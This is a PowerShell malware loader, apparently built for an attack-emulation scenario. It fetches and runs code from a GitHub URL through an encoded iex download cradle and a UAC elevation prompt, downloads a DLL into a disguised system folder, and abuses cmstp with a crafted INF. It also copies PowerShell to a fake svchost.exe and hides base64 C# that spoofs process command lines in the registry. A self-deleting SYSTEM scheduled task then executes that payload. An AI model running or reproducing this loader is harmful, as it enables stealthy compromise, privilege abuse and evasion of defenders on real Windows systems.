param()

# -- CONFIG: set this to the raw URL of the directory containing stage.dll --
#   i.e. the 'github/' folder uploaded to your repo (see Makefile sync target)
#   Example: https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github
$scriptBase = "https://github.com/Justanother-engineer/scenario1/raw/refs/heads/main"

# -- Elevation Gate ----------------------------------------------
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Not admin. Requesting elevation via UAC..."
    $scriptUrl = "$scriptBase/loader.ps1"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Host "[*] Running with admin privileges. Proceeding..."

# -- Logging -----------------------------------------------------
$logFile = "C:\ProgramData\loader.log"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

Write-Log "[*] loader.ps1 started - admin=True"

# Configuration
$githubBase = $scriptBase
$stageUrl = "$githubBase/stage.dll"
$stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$infPath = "C:\ProgramData\config.inf"
$masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
$regName = "App"
$taskName = "SecHealthSvc"

# Create scatter directories
New-Item -Path "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18" -ItemType Directory -Force | Out-Null
New-Item -Path "C:\ProgramData\Microsoft\Windows\Caches" -ItemType Directory -Force | Out-Null

# 1. Download stage.dll
Write-Host "[*] Downloading stage.dll..."
Write-Log "[*] Downloading stage.dll from $stageUrl"
Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing
if (Test-Path $stagePath) {
    $bytes = (Get-Item $stagePath).Length
    Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
} else {
    Write-Log "[-] stage.dll download FAILED"
}

# 2. Write config.inf
$infContent = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
RegisterOCXs=RegisterStage

[RegisterStage]
$stagePath
"@
Set-Content -Path $infPath -Value $infContent -Force
if (Test-Path $infPath) {
    Write-Log "[+] config.inf written - verified"
} else {
    Write-Log "[-] config.inf write FAILED"
}

# 3. Masquerade PowerShell
Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force
if (Test-Path $masqueradeDst) {
    $mbytes = (Get-Item $masqueradeDst).Length
    Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
} else {
    Write-Log "[-] Masquerade FAILED"
}

# 4. Stage C# execution wrapper in HKLM
$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwoKcHVibGljIHN0YXRpYyBjbGFzcyBTcG9vZgp7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NXKAogICAgICAgIHN0cmluZyBscEFwcGxpY2F0aW9uTmFtZSwKICAgICAgICBzdHJpbmcgbHBDb21tYW5kTGluZSwKICAgICAgICBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywKICAgICAgICBJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLAogICAgICAgIGJvb2wgYkluaGVyaXRIYW5kbGVzLAogICAgICAgIHVpbnQgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIEludFB0ciBscEVudmlyb25tZW50LAogICAgICAgIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksCiAgICAgICAgcmVmIFNUQVJUVVBJTkZPIGxwU3RhcnR1cEluZm8sCiAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKAogICAgICAgIEludFB0ciBoUHJvY2VzcywKICAgICAgICBpbnQgUHJvY2Vzc0luZm9ybWF0aW9uQ2xhc3MsCiAgICAgICAgb3V0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04gcGJpLAogICAgICAgIGludCBjYiwKICAgICAgICBvdXQgaW50IHJldHVybkxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgW091dF0gYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNSZWFkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IFJlc3VtZVRocmVhZChJbnRQdHIgaFRocmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgcHJpdmF0ZSBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDAwMDAwMDA0OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24gPSAwOwoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIGludCBjYjsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgIHB1YmxpYyBpbnQgZHdYOwogICAgICAgIHB1YmxpYyBpbnQgZHdZOwogICAgICAgIHB1YmxpYyBpbnQgZHdYU2l6ZTsKICAgICAgICBwdWJsaWMgaW50IGR3WVNpemU7CiAgICAgICAgcHVibGljIGludCBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3RmlsbEF0dHJpYnV0ZTsKICAgICAgICBwdWJsaWMgaW50IGR3RmxhZ3M7CiAgICAgICAgcHVibGljIHNob3J0IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgRXhpdFN0YXR1czsKICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkJhc2VBZGRyZXNzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQWZmaW5pdHlNYXNrOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQmFzZVByaW9yaXR5OwogICAgICAgIHB1YmxpYyBJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyBJbnRQdHIgSW5oZXJpdGVkRnJvbVVuaXF1ZVByb2Nlc3NJZDsKICAgIH0KCiAgICBwcml2YXRlIGNvbnN0IGludCBDb21tYW5kTGluZU9mZnNldCA9IDB4NzA7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIEdvKCkKICAgIHsKICAgICAgICBzdHJpbmcgc3Bvb2ZlZENtZCA9ICJjbXN0cC5leGUgL3MgQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjbXN0cC5pbmYiOwogICAgICAgIHN0cmluZyByZWFsQ21kID0gImNtc3RwLmV4ZSAvcyBDOlxcUHJvZ3JhbURhdGFcXGNvbmZpZy5pbmYiOwoKICAgICAgICBTVEFSVFVQSU5GTyBzaSA9IG5ldyBTVEFSVFVQSU5GTygpOwogICAgICAgIHNpLmNiID0gTWFyc2hhbC5TaXplT2YodHlwZW9mKFNUQVJUVVBJTkZPKSk7CgogICAgICAgIGlmICghQ3JlYXRlUHJvY2Vzc1cobnVsbCwgc3Bvb2ZlZENtZCwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCBmYWxzZSwKICAgICAgICAgICAgQ1JFQVRFX1NVU1BFTkRFRCwgSW50UHRyLlplcm8sIG51bGwsIHJlZiBzaSwgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcGkpKQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgaWYgKE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MocGkuaFByb2Nlc3MsIFByb2Nlc3NCYXNpY0luZm9ybWF0aW9uLAogICAgICAgICAgICBvdXQgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTiBwYmksIE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OKSksCiAgICAgICAgICAgIG91dCBpbnQgcmV0TGVuKSAhPSAwKQogICAgICAgIHsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBieXRlW10gcGViQnVmZmVyID0gbmV3IGJ5dGVbSW50UHRyLlNpemUgKiA0XTsKICAgICAgICBpZiAoIVJlYWRQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBwYmkuUGViQmFzZUFkZHJlc3MsIHBlYkJ1ZmZlciwgcGViQnVmZmVyLkxlbmd0aCwgb3V0IGludCBieXRlc1JlYWQpKQogICAgICAgIHsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpbnQgcHBPZmZzZXQgPSBJbnRQdHIuU2l6ZSA9PSA4ID8gMHgyMCA6IDB4MTA7CiAgICAgICAgSW50UHRyIHByb2Nlc3NQYXJhbWV0ZXJzUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKHBlYkJ1ZmZlciwgcHBPZmZzZXQpOwoKICAgICAgICBieXRlW10gY21kQnVmZmVyID0gbmV3IGJ5dGVbMTZdOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIEludFB0ci5BZGQocHJvY2Vzc1BhcmFtZXRlcnNQdHIsIENvbW1hbmRMaW5lT2Zmc2V0KSwgY21kQnVmZmVyLCBjbWRCdWZmZXIuTGVuZ3RoLCBvdXQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgYnl0ZVtdIG5ld0NtZEJ5dGVzID0gRW5jb2RpbmcuVW5pY29kZS5HZXRCeXRlcyhyZWFsQ21kKTsKICAgICAgICBJbnRQdHIgYnVmZmVyUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKGNtZEJ1ZmZlciwgOCk7CgogICAgICAgIGlmICghV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBidWZmZXJQdHIsIG5ld0NtZEJ5dGVzLCBuZXdDbWRCeXRlcy5MZW5ndGgsIG91dCBpbnQgd3JpdHRlbikpCiAgICAgICAgewogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGJ5dGVbXSBsZW5ndGhCeXRlcyA9IEJpdENvbnZlcnRlci5HZXRCeXRlcyhuZXdDbWRCeXRlcy5MZW5ndGgpOwogICAgICAgIGJ5dGVbXSBtYXhMZW5ndGhCeXRlcyA9IEJpdENvbnZlcnRlci5HZXRCeXRlcyhuZXdDbWRCeXRlcy5MZW5ndGgpOwogICAgICAgIEJ1ZmZlci5CbG9ja0NvcHkobGVuZ3RoQnl0ZXMsIDAsIGNtZEJ1ZmZlciwgMCwgMik7CiAgICAgICAgQnVmZmVyLkJsb2NrQ29weShtYXhMZW5ndGhCeXRlcywgMCwgY21kQnVmZmVyLCAyLCAyKTsKICAgICAgICBXcml0ZVByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIEludFB0ci5BZGQocHJvY2Vzc1BhcmFtZXRlcnNQdHIsIENvbW1hbmRMaW5lT2Zmc2V0KSwgY21kQnVmZmVyLCBjbWRCdWZmZXIuTGVuZ3RoLCBvdXQgd3JpdHRlbik7CgogICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICB9Cn0K"
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)

# Wrap C# in Add-Type so iex will compile + call it
$regValue = @"
Add-Type -TypeDefinition @'
$spoofSource
'@ -Language CSharp
[Spoof]::Go()
"@

New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
$checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
if ($checkVal) {
    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
} else {
    Write-Log "[-] Registry payload FAILED"
}

# 5. Create scheduled task with dynamic time (1 min from now)
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iex(gp '$regPath').$regName"
))
$taskAction = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$taskSettings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter "00:00:01" -Compatibility Win8
try {
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -User "SYSTEM" -Force -ErrorAction Stop
    Write-Log "[+] Task $taskName created (verified)"
    Write-Host "[+] Task '$taskName' scheduled. Running now..."
    Start-ScheduledTask -TaskName $taskName
    Write-Log "[*] Task $taskName triggered"
} catch {
    Write-Log "[-] Task creation FAILED - $_"
}
